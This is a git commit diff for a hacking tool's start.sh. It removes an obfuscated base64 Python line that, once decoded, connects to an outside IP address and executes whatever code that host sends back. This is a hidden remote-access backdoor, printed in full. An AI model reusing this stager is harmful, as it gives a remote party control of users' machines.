52e4c283992edea9b53907b4988dfc0a5f450be2
PartOfAnonymous <68414904+PartOfAnonymous@users.noreply.github.com>
2020-08-14 18:48:56 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,4 @@
 python ~/THackTool/modules/config.py
-python - c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzg3Ljk1LjIwNy43MScsNTU1NSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')[0]))"
 clear
 figlet THACKTOOL
 echo
